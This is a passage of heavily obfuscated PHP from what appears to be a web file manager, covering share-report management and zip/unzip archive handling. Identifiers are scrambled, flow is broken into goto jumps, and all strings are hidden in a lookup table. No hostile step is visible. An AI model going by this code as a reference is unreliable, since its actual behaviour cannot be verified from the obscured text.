$CÃ∂˜÷éîﬁ[47]; goto Cä¢‘ü£≠Õ; Cä¢‘ü£≠Õ: $eà¨´‚ã∏ = array($CÃ∂˜÷éîﬁ[415] => array($CÃ∂˜÷éîﬁ[7], $eÁ‚»Ïå⁄É), $CÃ∂˜÷éîﬁ[455] => array($CÃ∂˜÷éîﬁ[761], "\45{$FßãùŒæÒ†}\x25"), $CÃ∂˜÷éîﬁ[393] => 0); $CÑ—›·≤ÕÈ = Model($CÃ∂˜÷éîﬁ[762])->where($eà¨´‚ã∏)->field($CÃ∂˜÷éîﬁ[2215])->find(); if (!$CÑ—›·≤ÕÈ) { return !1; } goto A◊ÃŒµãÕî; Fò≥¨ß†ÿô: $e¯—Òÿ°ñç = array_to_keyvalue($fåóúéœÖƒ, $CÃ∂˜÷éîﬁ[33], $CÃ∂˜÷éîﬁ[28]); $e¯—Òÿ°ñç[] = $CÑ—›·≤ÕÈ[$CÃ∂˜÷éîﬁ[28]]; return implode($CÃ∂˜÷éîﬁ[8], $e¯—Òÿ°ñç); goto EÂà‡Ô≤æ¨; c€›—Éíùµ: $CÃ∂˜÷éîﬁ =& $_SERVER[—Ω]; $eà¨´‚ã∏ = array($CÃ∂˜÷éîﬁ[415] => array($CÃ∂˜÷éîﬁ[932], 0), $CÃ∂˜÷éîﬁ[699] => 3); $eÁ‚»Ïå⁄É = Model($CÃ∂˜÷éîﬁ[2214])->where($eà¨´‚ã∏)->field($CÃ∂˜÷éîﬁ[415])->select(); goto A©É¯ƒòÂ¯; EÂà‡Ô≤æ¨: } protected function remove($C∆œÔÓºÉË) { goto fã˘êπÆåË; fã˘êπÆåË: $d∏‹√ñÇüæ =& $_SERVER[—Ω]; if (is_array($C∆œÔÓºÉË)) { $C∆œÔÓºÉË = array($d∏‹√ñÇüæ[7], $C∆œÔÓºÉË); } $Fƒèıß©™™ = array($d∏‹√ñÇüæ[437] => $C∆œÔÓºÉË); goto Eü»èª¨äï; Eü»èª¨äï: $bù≈’íØ´Ÿ = $this->where($Fƒèıß©™™)->delete(); if ($bù≈’íØ´Ÿ) { Model($d∏‹√ñÇüæ[533])->where(array($d∏‹√ñÇüæ[437] => $C∆œÔÓºÉË))->delete(); } $Cã‰µ≤¨Õ© = is_array($C∆œÔÓºÉË) ? $C∆œÔÓºÉË[1] : array($C∆œÔÓºÉË); goto bòÆÌ√çÍ‰; bòÆÌ√çÍ‰: for ($Eëµ∫º¬¿© = 0; $Eëµ∫º¬¿© < count($Cã‰µ≤¨Õ©); $Eëµ∫º¬¿©++) { $f∏è™Ç‡√ã = $this->getInfo($Cã‰µ≤¨Õ©[$Eëµ∫º¬¿©]); if ($f∏è™Ç‡√ã[$d∏‹√ñÇüæ[444]] == $d∏‹√ñÇüæ[83]) { Model($d∏‹√ñÇüæ[501])->eventShare($f∏è™Ç‡√ã[$d∏‹√ñÇüæ[366]], $d∏‹√ñÇüæ[2201]); } if ($f∏è™Ç‡√ã[$d∏‹√ñÇüæ[442]] == $d∏‹√ñÇüæ[83]) { Model($d∏‹√ñÇüæ[501])->eventShare($f∏è™Ç‡√ã[$d∏‹√ñÇüæ[366]], $d∏‹√ñÇüæ[2200]); } } return $bù≈’íØ´Ÿ; goto eá˘çÊáî’; eá˘çÊáî’: } protected function removeBySource($bë¯¯æçØ˜) { goto EéÏ™ªÁëÙ; cÁªÑÜ≠§ï: $a§ËÏûÀ÷ù = array_to_keyvalue($a§ËÏûÀ÷ù, $féÉÿä›–Ù[33], $féÉÿä›–Ù[437]); if (!$a§ËÏûÀ÷ù) { return; } $aâ∏¿æ·ÎÌ = array($féÉÿä›–Ù[436] => array($féÉÿä›–Ù[381], $a§ËÏûÀ÷ù)); goto CÆåá·ˆÔ»; EéÏ™ªÁëÙ: $féÉÿä›–Ù =& $_SERVER[—Ω]; $aâ∏¿æ·ÎÌ = array($féÉÿä›–Ù[380] => array($féÉÿä›–Ù[381], $bë¯¯æçØ˜)); $a§ËÏûÀ÷ù = $this->field($féÉÿä›–Ù[437])->where($aâ∏¿æ·ÎÌ)->select(); goto cÁªÑÜ≠§ï; CÆåá·ˆÔ»: $this->where($aâ∏¿æ·ÎÌ)->delete(); Model($féÉÿä›–Ù[533])->where($aâ∏¿æ·ÎÌ)->delete(); goto A¥±Œ€‰Óª; A¥±Œ€‰Óª: } public function listAll($e≥¨êŒâ™ô) { goto CÇ¡õªº¥; CÇ¡õªº¥: $D«Ì¿åæøÌ =& $_SERVER[—Ω]; $E¬˜ôÌﬂê = array(); if ($e≥¨êŒâ™ô[$D«Ì¿åæøÌ[1417]]) { $E¬˜ôÌﬂê[$D«Ì¿åæøÌ[1417]] = $e≥¨êŒâ™ô[$D«Ì¿åæøÌ[1417]]; } goto bæ◊˜ØıÛ≠; bæ◊˜ØıÛ≠: if ($e≥¨êŒâ™ô[$D«Ì¿åæøÌ[712]]) { $D°ÓÜ◊©®í = $e≥¨êŒâ™ô[$D«Ì¿åæøÌ[713]] ? $e≥¨êŒâ™ô[$D«Ì¿åæøÌ[713]] : strtotime(date($D«Ì¿åæøÌ[2216])); $E¬˜ôÌﬂê[$D«Ì¿åæøÌ[184]] = array($D«Ì¿åæøÌ[318], array($e≥¨êŒâ™ô[$D«Ì¿åæøÌ[712]], $D°ÓÜ◊©®í)); } if ($e≥¨êŒâ™ô[$D«Ì¿åæøÌ[29]]) { $E¬˜ôÌﬂê[$e≥¨êŒâ™ô[$D«Ì¿åæøÌ[29]]] = 1; } else { $E¬˜ôÌﬂê[] = array($D«Ì¿åæøÌ[442] => array($D«Ì¿åæøÌ[932], 0), $D«Ì¿åæøÌ[444] => array($D«Ì¿åæøÌ[932], 0), $D«Ì¿åæøÌ[2191] => $D«Ì¿åæøÌ[2160]); } if ($e≥¨êŒâ™ô[$D«Ì¿åæøÌ[2156]]) { $E¬˜ôÌﬂê[] = array($D«Ì¿åæøÌ[439] => $e≥¨êŒâ™ô[$D«Ì¿åæøÌ[2156]], $D«Ì¿åæøÌ[1325] => array($D«Ì¿åæøÌ[761], "\45{$e≥¨êŒâ™ô[$D«Ì¿åæøÌ[2156]]}\45"), $D«Ì¿åæøÌ[2191] => $D«Ì¿åæøÌ[2160]); } goto aèÔçü≤ÚÈ; aèÔçü≤ÚÈ: $CÊ•ç›ƒÂ’ = $this->_makeOrder()->where($E¬˜ôÌﬂê)->selectPage(20); if (empty($CÊ•ç›ƒÂ’[$D«Ì¿åæøÌ[351]])) { return array(); } $this->_listDataApply($CÊ•ç›ƒÂ’[$D«Ì¿åæøÌ[351]]); goto cÒÂã¨—ÇÂ; cÒÂã¨—ÇÂ: return $CÊ•ç›ƒÂ’; goto e≈‰»ÚﬁƒË; e≈‰»ÚﬁƒË: } public function listDataApply($eÜà¶°úî«) { $this->_listDataApply($eÜà¶°úî«); return $eÜà¶°úî«; } private function _listDataApply(&$b´≤ÌÑ¯Ë€) { $Bº©ïè√êÁ =& $_SERVER[—Ω]; $a±—±≤‡åã = array_to_keyvalue($b´≤ÌÑ¯Ë€, $Bº©ïè√êÁ[33], $Bº©ïè√êÁ[1417]); $e¶“∑¬“ãÍ = Model($Bº©ïè√êÁ[473])->userListInfo(array_unique($a±—±≤‡åã)); $Dêœ∂ºÆ¨ô = array_to_keyvalue($b´≤ÌÑ¯Ë€, $Bº©ïè√êÁ[33], $Bº©ïè√êÁ[366]); $DìÎÀ«è¡ç = Model($Bº©ïè√êÁ[762])->sourceListInfo($Dêœ∂ºÆ¨ô, !0); foreach ($b´≤ÌÑ¯Ë€ as &$CÍïçé˜Ïï) { $b¨ßô®‡¯È = $CÍïçé˜Ïï[$Bº©ïè√êÁ[1417]]; $CÍïçé˜Ïï[$Bº©ïè√êÁ[2217]] = $e¶“∑¬“ãÍ[$b¨ßô®‡¯È] ? $e¶“∑¬“ãÍ[$b¨ßô®‡¯È] : !1; $D¥é¡çﬂÁ— = $CÍïçé˜Ïï[$Bº©ïè√êÁ[366]]; $CÍïçé˜Ïï[$Bº©ïè√êÁ[388]] = $DìÎÀ«è¡ç[$D¥é¡çﬂÁ—] ? $DìÎÀ«è¡ç[$D¥é¡çﬂÁ—] : !1; } } private function _makeOrder($Dòè∏÷“±É = '') { goto dÜ“ïáè∂å; bóê•©÷çÔ: $Dòè∏÷“±É = $Dòè∏÷“±É . "{$b˜À˜•æãè}\40{$CºœÊ°ã°›}"; return $this->order($Dòè∏÷“±É); goto fì¥Ü∏ÆÒ˜; dÜ“ïáè∂å: $B±≠§ Ã¿Ç =& $_SERVER[—Ω]; $FœáƒÎ∂ØÑ = array($B±≠§ Ã¿Ç[184], $B±≠§ Ã¿Ç[713], $B±≠§ Ã¿Ç[2203], $B±≠§ Ã¿Ç[2204]); $dèÍâüâîà = array($B±≠§ Ã¿Ç[398] => $B±≠§ Ã¿Ç[399], $B±≠§ Ã¿Ç[400] => $B±≠§ Ã¿Ç[401]); goto D˜‡î„Îâå; D˜‡î„Îâå: $b˜À˜•æãè = Input::get($B±≠§ Ã¿Ç[403], $B±≠§ Ã¿Ç[7], $B±≠§ Ã¿Ç[386], $FœáƒÎ∂ØÑ); $CºœÊ°ã°› = Input::get($B±≠§ Ã¿Ç[404], $B±≠§ Ã¿Ç[7], $B±≠§ Ã¿Ç[2218], array($B±≠§ Ã¿Ç[2155], $B±≠§ Ã¿Ç[400])); $CºœÊ°ã°› = $dèÍâüâîà[$CºœÊ°ã°›]; goto bóê•©÷çÔ; fì¥Ü∏ÆÒ˜: } public function reportAdd($e˜À¶Ã˘ Æ) { $FàÍâ£õ§ê =& $_SERVER[—Ω]; $A∂À…©úêÖ = array($FàÍâ£õ§ê[437] => $e˜À¶Ã˘ Æ[$FàÍâ£õ§ê[437]], $FàÍâ£õ§ê[1417] => USER_ID); if (Model($FàÍâ£õ§ê[2214])->where($A∂À…©úêÖ)->find()) { return !1; } $fÑ¶ëÃª€ﬂ = array($FàÍâ£õ§ê[437] => $e˜À¶Ã˘ Æ[$FàÍâ£õ§ê[437]], $FàÍâ£õ§ê[1325] => $e˜À¶Ã˘ Æ[$FàÍâ£õ§ê[1325]], $FàÍâ£õ§ê[366] => $e˜À¶Ã˘ Æ[$FàÍâ£õ§ê[366]], $FàÍâ£õ§ê[415] => $e˜À¶Ã˘ Æ[$FàÍâ£õ§ê[415]], $FàÍâ£õ§ê[1417] => USER_ID, $FàÍâ£õ§ê[29] => $e˜À¶Ã˘ Æ[$FàÍâ£õ§ê[29]], $FàÍâ£õ§ê[401] => $e˜À¶Ã˘ Æ[$FàÍâ£õ§ê[401]]); return Model($FàÍâ£õ§ê[2214])->add($fÑ¶ëÃª€ﬂ); } public function reportList($e æ≤ÇºÇÔ) { goto B∆ç§∑Ãæ”; dÇ’´∆ÉõÂ: if (empty($CÙˆ¬˜÷‹ç[$eäÜâé‰ƒ¬[351]])) { return array(); } $this->_listDataApply($CÙˆ¬˜÷‹ç[$eäÜâé‰ƒ¬[351]]); return $CÙˆ¬˜÷‹ç; goto dü¥òéıÕ˜; B∆ç§∑Ãæ”: $eäÜâé‰ƒ¬ =& $_SERVER[—Ω]; $eÓûßÕËñ± = array(); if ($e æ≤ÇºÇÔ[$eäÜâé‰ƒ¬[712]]) { $eÖ§‰€∆§ï = $e æ≤ÇºÇÔ[$eäÜâé‰ƒ¬[713]] ? $e æ≤ÇºÇÔ[$eäÜâé‰ƒ¬[713]] : strtotime(date($eäÜâé‰ƒ¬[2216])); $eÓûßÕËñ±[$eäÜâé‰ƒ¬[184]] = array($eäÜâé‰ƒ¬[318], array($e æ≤ÇºÇÔ[$eäÜâé‰ƒ¬[712]], $eÖ§‰€∆§ï)); } goto eîù√óò≈Ø; eîù√óò≈Ø: if (isset($e æ≤ÇºÇÔ[$eäÜâé‰ƒ¬[29]]) && in_array($e æ≤ÇºÇÔ[$eäÜâé‰ƒ¬[29]], array($eäÜâé‰ƒ¬[83], $eäÜâé‰ƒ¬[2219], $eäÜâé‰ƒ¬[2220], $eäÜâé‰ƒ¬[2221], $eäÜâé‰ƒ¬[1896]))) { $eÓûßÕËñ±[$eäÜâé‰ƒ¬[29]] = $e æ≤ÇºÇÔ[$eäÜâé‰ƒ¬[29]]; } if (isset($e æ≤ÇºÇÔ[$eäÜâé‰ƒ¬[699]]) && in_array($e æ≤ÇºÇÔ[$eäÜâé‰ƒ¬[699]], array($eäÜâé‰ƒ¬[464], $eäÜâé‰ƒ¬[83], $eäÜâé‰ƒ¬[2219], $eäÜâé‰ƒ¬[2220]))) { $eÓûßÕËñ±[$eäÜâé‰ƒ¬[699]] = $e æ≤ÇºÇÔ[$eäÜâé‰ƒ¬[699]]; } $E™”·°ìÃã = Input::get($eäÜâé‰ƒ¬[404], $eäÜâé‰ƒ¬[7], $eäÜâé‰ƒ¬[2218], array($eäÜâé‰ƒ¬[2155], $eäÜâé‰ƒ¬[400])); goto dÆõ‹≈ï‘ƒ; dÆõ‹≈ï‘ƒ: $aÉùä“∆æè = array($eäÜâé‰ƒ¬[398] => $eäÜâé‰ƒ¬[399], $eäÜâé‰ƒ¬[400] => $eäÜâé‰ƒ¬[401]); $EÛ€û…£Ùó = $eäÜâé‰ƒ¬[2222] . $aÉùä“∆æè[$E™”·°ìÃã]; $CÙˆ¬˜÷‹ç = Model($eäÜâé‰ƒ¬[2214])->where($eÓûßÕËñ±)->order($EÛ€û…£Ùó)->selectPage(20); goto dÇ’´∆ÉõÂ; dü¥òéıÕ˜: } public function reportStatus($fﬂÂé§Ω”⁄) { goto D‘Ω‘Æ≤ÍÙ; D‘Ω‘Æ≤ÍÙ: $EÒ≥ïˆ∞˘‘ =& $_SERVER[—Ω]; $c√Æé≠—œü = array($EÒ≥ïˆ∞˘‘[364] => $fﬂÂé§Ω”⁄[$EÒ≥ïˆ∞˘‘[364]]); $FÓóèçÕˆÑ = Model($EÒ≥ïˆ∞˘‘[2214])->where($c√Æé≠—œü)->field($EÒ≥ïˆ∞˘‘[2223])->find(); goto AõÖ¶˜ÇÔØ; fä⁄ãÃ‡≥£: return $c•ì≠â„Ωı; goto B˜œµËÊû√; BÕì®‡ÿ≤„: $c•ì≠â„Ωı = Model($EÒ≥ïˆ∞˘‘[2214])->where($c√Æé≠—œü)->save($B¯àΩçŸâ’); if ($fﬂÂé§Ω”⁄[$EÒ≥ïˆ∞˘‘[699]] == $EÒ≥ïˆ∞˘‘[2219]) { if ($FÓóèçÕˆÑ[$EÒ≥ïˆ∞˘‘[415]] != $EÒ≥ïˆ∞˘‘[464] && $this->shareFileMeta($FÓóèçÕˆÑ[$EÒ≥ïˆ∞˘‘[415]])) { $this->shareFileMeta($FÓóèçÕˆÑ[$EÒ≥ïˆ∞˘‘[415]], 0); } return $this->remove($FÓóèçÕˆÑ[$EÒ≥ïˆ∞˘‘[437]]); } if ($c•ì≠â„Ωı && $fﬂÂé§Ω”⁄[$EÒ≥ïˆ∞˘‘[699]] == $EÒ≥ïˆ∞˘‘[2220]) { $E÷Áñ∞ñºÉ = $B¯àΩçŸâ’[$EÒ≥ïˆ∞˘‘[699]] == $EÒ≥ïˆ∞˘‘[2220] ? 1 : 0; $this->shareFileMeta($FÓóèçÕˆÑ[$EÒ≥ïˆ∞˘‘[415]], $E÷Áñ∞ñºÉ); $this->removeByFile($FÓóèçÕˆÑ[$EÒ≥ïˆ∞˘‘[415]]); } goto fä⁄ãÃ‡≥£; AõÖ¶˜ÇÔØ: if (!$FÓóèçÕˆÑ) { return !1; } $B¯àΩçŸâ’ = array($EÒ≥ïˆ∞˘‘[699] => $fﬂÂé§Ω”⁄[$EÒ≥ïˆ∞˘‘[699]]); if ($fﬂÂé§Ω”⁄[$EÒ≥ïˆ∞˘‘[699]] == $EÒ≥ïˆ∞˘‘[2220] && $FÓóèçÕˆÑ[$EÒ≥ïˆ∞˘‘[699]] == $EÒ≥ïˆ∞˘‘[2220]) { $B¯àΩçŸâ’[$EÒ≥ïˆ∞˘‘[699]] = 0; } goto BÕì®‡ÿ≤„; B˜œµËÊû√: } private function removeByFile($F ∆÷⁄ıÂ’) { goto aÌƒÖÀÓÊ◊; BÇ•ÖòÆ™„: $this->remove($a à≥Ï•Æ´); goto Dö‚ ¥Ñƒœ; d‘◊≈ÌÏò: $f≠°ÙÇî“ê = array($CäˆÚêè¶á[366] => array($CäˆÚêè¶á[7], $A…ü„ìÒø), $CäˆÚêè¶á[442] => 1); $c¬∆ÙôêÔ… = Model($CäˆÚêè¶á[2057])->where($f≠°ÙÇî“ê)->field($CäˆÚêè¶á[437])->select(); $a à≥Ï•Æ´ = array_to_keyvalue($c¬∆ÙôêÔ…, $CäˆÚêè¶á[33], $CäˆÚêè¶á[437]); goto BÇ•ÖòÆ™„; aÌƒÖÀÓÊ◊: $CäˆÚêè¶á =& $_SERVER[—Ω]; $c¬∆ÙôêÔ… = Model($CäˆÚêè¶á[762])->where(array($CäˆÚêè¶á[415] => $F ∆÷⁄ıÂ’))->field($CäˆÚêè¶á[366])->select(); $A…ü„ìÒø = array_to_keyvalue($c¬∆ÙôêÔ…, $CäˆÚêè¶á[33], $CäˆÚêè¶á[366]); goto d‘◊≈ÌÏò; Dö‚ ¥Ñƒœ: } private function shareFileMeta($BùÜ∫±ö‘∑, $Bö≥Õù™ßÂ = null) { $aﬁ¨áÏîıﬂ =& $_SERVER[—Ω]; $DíØΩ◊Áê· = array($aﬁ¨áÏîıﬂ[415] => $BùÜ∫±ö‘∑, $aﬁ¨áÏîıﬂ[89] => $aﬁ¨áÏîıﬂ[2224]); if (is_null($Bö≥Õù™ßÂ)) { return Model($aﬁ¨áÏîıﬂ[2225])->where($DíØΩ◊Áê·)->find(); } $DíØΩ◊Áê·[$aﬁ¨áÏîıﬂ[356]] = $Bö≥Õù™ßÂ; Model($aﬁ¨áÏîıﬂ[2225])->add($DíØΩ◊Áê·, array(), !0); } } goto Bò≈…ã“ª»; A‹èÖ„ˆ‚ï: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $fºü⁄›”ƒÓ; if (!$fºü⁄›”ƒÓ) { $A‚ñ¶ÎÉÔ∏ = IO::init($_SERVER[—Ω][8]); } return $A‚ñ¶ÎÉÔ∏; } private static function iconvSystem($e∫£”ËÈ‘≈) { return self::local()->iconvSystem($e∫£”ËÈ‘≈); } private static function iconvApp($FÓ⁄¨¨®§ﬂ) { return self::local()->iconvApp($FÓ⁄¨¨®§ﬂ); } public static function zip($D÷ÏÇ‹¶À, $f›åè¶¶•œ = "\172\151\160", $EÂÕ¯ê‰ π = '', $Eƒ•Œøø¶Æ = REPEAT_RENAME) { goto bùÙŒú…ˆü; DÏû®â≈üü: $D—ÂïÀ¢õﬂ = !1; if (!$EÂÕ¯ê‰ π && $d£æœ‡è≤Á->getType() == $e‘ß€Ÿ∞ç£[103]) { $DœææëÙ©¯ = self::zipFileList($D÷ÏÇ‹¶À); } else { $D—ÂïÀ¢õﬂ = $EÂÕ¯ê‰ π ? $EÂÕ¯ê‰ π : TEMP_FILES . $e‘ß€Ÿ∞ç£[1029] . time() . rand_string(8) . $e‘ß€Ÿ∞ç£[8]; mk_dir($D—ÂïÀ¢õﬂ); $DœææëÙ©¯ = self::zipFileList($D÷ÏÇ‹¶À, $D—ÂïÀ¢õﬂ); } $F⁄Ÿª∏ıÇ = $B“ç†éÍúÓ[$e‘ß€Ÿ∞ç£[28]]; goto bÖ¨œã©—Õ; bùÙŒú…ˆü: $e‘ß€Ÿ∞ç£ =& $_SERVER[—Ω]; $d£æœ‡è≤Á = self::init($D÷ÏÇ‹¶À[0][$e‘ß€Ÿ∞ç£[75]]); $B“ç†éÍúÓ = self::info($D÷ÏÇ‹¶À[0][$e‘ß€Ÿ∞ç£[75]]); goto DÏû®â≈üü; dòéÛ›·…‹: $c’Îï±–∑ê = $fÈË§ÆÂ÷ . $F⁄Ÿª∏ıÇ . $e‘ß€Ÿ∞ç£[93] . $f›åè¶¶•œ; $c’Îï±–∑ê = get_filename_auto($c’Îï±–∑ê, $e‘ß€Ÿ∞ç£[33], $Eƒ•Œøø¶Æ); $Aæ€Ò€€âû = self::iconvSystem($c’Îï±–∑ê); goto c•’ø¬ÚΩô; c•’ø¬ÚΩô: foreach ($DœææëÙ©¯ as $dÔÜøË…œ· => $C—Â∆¥øèè) { $DœææëÙ©¯[$dÔÜøË…œ·] = self::iconvSystem($C—Â∆¥øèè); } KodArchive::create($Aæ€Ò€€âû, $DœææëÙ©¯); if (!IO::exist($c’Îï±–∑ê)) { if ($D—ÂïÀ¢õﬂ) { del_dir($D—ÂïÀ¢õﬂ); } show_json(LNG($e‘ß€Ÿ∞ç£[1031]), !1); } goto cµÃà•é©ﬂ; cµÃà•é©ﬂ: if ($EÂÕ¯ê‰ π || !$D—ÂïÀ¢õﬂ) { if ($D—ÂïÀ¢õﬂ && strstr($D—ÂïÀ¢õﬂ, TEMP_FILES)) { $CÂÇ”Â≠Ø‘ = $DœææëÙ©¯ = array(); recursion_dir($fÈË§ÆÂ÷, $CÂÇ”Â≠Ø‘, $DœææëÙ©¯, 0); foreach ($CÂÇ”Â≠Ø‘ as $B≤ñ‹ΩöÚœ) { del_dir($B≤ñ‹ΩöÚœ); } foreach ($DœææëÙ©¯ as $BôñΩ…•¡Ù) { if ($BôñΩ…•¡Ù == $Aæ€Ò€€âû) { continue; } del_file($BôñΩ…•¡Ù); } } return $c’Îï±–∑ê; } $CãÃ™äé û = self::pathFather($B“ç†éÍúÓ[$e‘ß€Ÿ∞ç£[75]]); $bıç√≈ë†« = self::move($c’Îï±–∑ê, $CãÃ™äé û, $Eƒ•Œøø¶Æ); goto dñ®ôÑ˜ëù; dñ®ôÑ˜ëù: if (!$bıç√≈ë†«) { del_dir($D—ÂïÀ¢õﬂ); show_json(LNG($e‘ß€Ÿ∞ç£[1031]), !1); } del_dir($D—ÂïÀ¢õﬂ); return $bıç√≈ë†«; goto Aä±≥»“ﬁä; bÖ¨œã©—Õ: if (count($DœææëÙ©¯) > 1) { $A¬∑ıáÜ‘˘ = IO::info(IO::pathFather($B“ç†éÍúÓ[$e‘ß€Ÿ∞ç£[75]])); $F⁄Ÿª∏ıÇ = $A¬∑ıáÜ‘˘[$e‘ß€Ÿ∞ç£[28]]; } $fÈË§ÆÂ÷ = $D—ÂïÀ¢õﬂ; if (!$fÈË§ÆÂ÷) { $fÈË§ÆÂ÷ = get_path_father($B“ç†éÍúÓ[$e‘ß€Ÿ∞ç£[75]]); $CÓ©®öÔ«› = IO::info($fÈË§ÆÂ÷); if (!$CÓ©®öÔ«›[$e‘ß€Ÿ∞ç£[186]]) { show_json(LNG($e‘ß€Ÿ∞ç£[1030]), !1); } } goto dòéÛ›·…‹; Aä±≥»“ﬁä: } public static function unzip($Eﬁ≤‡¨–’, $Dö˘›Ü™Ö– = "\162\x65\160\x6c\x61\143\145") { goto b¶Ââ⁄™ë“; f¡Ñ≥ Ìº–: $FÉ’á≥•°Ç = KodArchive::extract($dà‰„Ôµ≥Õ, $aïˆç⁄‡º§ . $b‰é©˘›Íç[8], $Fò∂≤€¢÷Ã); self::archiveExt(); if (!$FÉ’á≥•°Ç[$b‰é©˘›Íç[1036]]) { show_json($b‰é©˘›Íç[1037] . $FÉ’á≥•°Ç[$b‰é©˘›Íç[1038]], !1); } goto AÛ´åë›Ÿø; AÛ´åë›Ÿø: Hook::trigger($b‰é©˘›Íç[1039], $aïˆç⁄‡º§); recursion_dir($aïˆç⁄‡º§, $fàö¿√ÙµÌ, $Cﬁ∂¿ãà—‡, 0); $C©ﬂª„¯πÓ = array_merge($fàö¿√ÙµÌ, $Cﬁ∂¿ãà—‡); goto f —¿Î∂ç“; f —¿Î∂ç“: foreach ($C©ﬂª„¯πÓ as $CΩåœŸæ“Ø) { $CΩåœŸæ“Ø = self::iconvApp($CΩåœŸæ“Ø); self::move($CΩåœŸæ“Ø, $bÀêèà≠£Á, $Dö˘›Ü™Ö–); } del_dir($aïˆç⁄‡º§); if (!$D´Éõ¨‘ó¢) { del_file($dà‰„Ôµ≥Õ); } goto fπöàì›Ïﬁ; b◊¥æç∏•ÿ: mk_dir($aïˆç⁄‡º§); $EÔ…ÉÎ•® = self::fileExt($C≠ÎæÈ∆‰π); $dà‰„Ôµ≥Õ = $aïˆç⁄‡º§ . $b‰é©˘›Íç[93] . $EÔ…ÉÎ•®; goto c⁄„Üç€á’; b∑å∞øÑ∂ç: if (!($C≠ÎæÈ∆‰π = parent::info($aá≈…Óπ›‰))) { show_json(LNG($b‰é©˘›Íç[1033]), !1); } if (!($D«£ò’’ÖÍ = parent::infoFull($bÀêèà≠£Á))) { $bÀêèà≠£Á = parent::mkdir($bÀêèà≠£Á); $D«£ò’’ÖÍ = array($b‰é©˘›Íç[75] => $bÀêèà≠£Á); } else { if (isset($D«£ò’’ÖÍ[$b‰é©˘›Íç[366]]) && trim($D«£ò’’ÖÍ[$b‰é©˘›Íç[75]], $b‰é©˘›Íç[8]) != trim($bÀêèà≠£Á, $b‰é©˘›Íç[8])) { $A≠ıÔÑÏ˜Ω = KodIO::make($D«£ò’’ÖÍ[$b‰é©˘›Íç[457]]); $d¶ÏÃ⁄≥„– = parent::fileNameAuto($A≠ıÔÑÏ˜Ω, $D«£ò’’ÖÍ[$b‰é©˘›Íç[28]], REPEAT_RENAME_FOLDER, !0); $bÀêèà≠£Á = parent::mkdir($A≠ıÔÑÏ˜Ω . $d¶ÏÃ⁄≥„–); $D«£ò’’ÖÍ = array($b‰é©˘›Íç[75] => $bÀêèà≠£Á); } } $bÀêèà≠£Á = $D«£ò’’ÖÍ[$b‰é©˘›Íç[75]]; goto AÏ÷∑Ï£⁄ã; AÏ÷∑Ï£⁄ã: $eŸﬁ–úÉî÷ = self::tmpFileName($C≠ÎæÈ∆‰π); $aïˆç⁄‡º§ = TEMP_FILES . $eŸﬁ–úÉî÷; del_dir($aïˆç⁄‡º§); goto b◊¥æç∏•ÿ; c⁄„Üç€á’: if (!@file_exists(self::iconvSystem($dà‰„Ôµ≥Õ))) { $D´Éõ¨‘ó¢ = self::localFilePath($aá≈…Óπ›‰, $EÔ…ÉÎ•®); $dà‰„Ôµ≥Õ = $D´Éõ¨‘ó¢ ? $D´Éõ¨‘ó¢ : parent::download($aá≈…Óπ›‰, $dà‰„Ôµ≥Õ); } $dà‰„Ôµ≥Õ = self::iconvSystem($dà‰„Ôµ≥Õ); $Fò∂≤€¢÷Ã = isset($Eﬁ≤‡¨–’[$b‰é©˘›Íç[1034]]) ? $Eﬁ≤‡¨–’[$b‰é©˘›Íç[1034]] : $b‰é©˘›Íç[1035]; goto f¡Ñ≥ Ìº–; fπöàì›Ïﬁ: return !0; goto F –ÃÜπá¥; b¶Ââ⁄™ë“: $b‰é©˘›Íç =& $_SERVER[—Ω]; $aá≈…Óπ›‰ = $Eﬁ≤‡¨–’[$b‰é©˘›Íç[75]]; $bÀêèà≠£Á = $Eﬁ≤‡¨–’[$b‰é©˘›Íç[1032]]; goto b∑å∞øÑ∂ç; F –ÃÜπá¥: } public static function unzipList($f⁄ŒìÎ§·ó) { goto b“å„“⁄øÌ; fÖíÃ·Ì¨ë: if (!is_dir($AŒíÌÓÊè∂)) { mk_dir($AŒíÌÓÊè∂); } $b›äÇ∑¬‰· = $AŒíÌÓÊè∂ . $bÀÎå⁄Öã™[8] . $Dªﬁ¯åëÏ√; if (!@file_exists(self::iconvSystem($b›äÇ∑¬‰·))) { if (isset($b∫Ö£ŒÉŸÈ)) { url_request($D∏—Ë÷ı€£, $bÀÎå⁄Öã™[1043], $b›äÇ∑¬‰·); } else { $E †ï¿˘Í• = self::localFilePath($D∏—Ë÷ı€£, $eç◊´Î∑⁄©); $b›äÇ∑¬‰· = $E †ï¿˘Í• ? $E †ï¿˘Í• : self::download($D∏—Ë÷ı€£, $b›äÇ∑¬‰·); } } goto D€Ó∆¯¯Àª; a≈ó÷üÛƒé: $AÜÛØàºŒñ = json_encode($Cî…ºï——∆[$bÀÎå⁄Öã™[1038]]); self::setContent($Aı∑¢‡á·≠, $AÜÛØàºŒñ); if (count($Cî…ºï——∆[$bÀÎå⁄Öã™[1038]]) >= $f€Æ˜®ﬁ·ê) { show_json(sprintf(LNG($bÀÎå⁄Öã™[1042]), count($Cî…ºï——∆[$bÀÎå⁄Öã™[1038]])), !1); } goto d¨öõá≠Ùù; D¨¨≤˜•‚ê: self::archiveExt(); del_dir($AŒíÌÓÊè∂); if (!$Cî…ºï——∆[$bÀÎå⁄Öã™[1036]]) { show_json($Cî…ºï——∆[$bÀÎå⁄Öã™[1038]], !1); } goto a≈ó÷üÛƒé; b“å„“⁄øÌ: $bÀÎå⁄Öã™ =& $_SERVER[—Ω]; $D∏—Ë÷ı€£ = $f⁄ŒìÎ§·ó[$bÀÎå⁄Öã™[75]]; $fπ—≈é‘¨ú = isset($f⁄ŒìÎ§·ó[$bÀÎå⁄Öã™[1040]]) ? $f⁄ŒìÎ§·ó[$bÀÎå⁄Öã™[1040]] : -1; goto CÚÎ§–ªŸæ; D€Ó∆¯¯Àª: $b›äÇ∑¬‰· = self::iconvSystem($b›äÇ∑¬‰·); if ($fπ—≈é‘¨ú >= 0) { $bëã¬⁄“§á = isset($f⁄ŒìÎ§·ó[$bÀÎå⁄Öã™[1044]]) ? $f⁄ŒìÎ§·ó[$bÀÎå⁄Öã™[1044]] : !1; $AÒ¨¶Œ˜ö± = isset($f⁄ŒìÎ§·ó[$bÀÎå⁄Öã™[28]]) ? $f⁄ŒìÎ§·ó[$bÀÎå⁄Öã™[28]] : $bÀÎå⁄Öã™[33]; KodArchive::filePreview($b›äÇ∑¬‰·, $fπ—≈é‘¨ú, $bëã¬⁄“§á, $AÒ¨¶Œ˜ö±); self::archiveExt(); die; } $Cî…ºï——∆ = KodArchive::listContent($b›äÇ∑¬‰·); goto 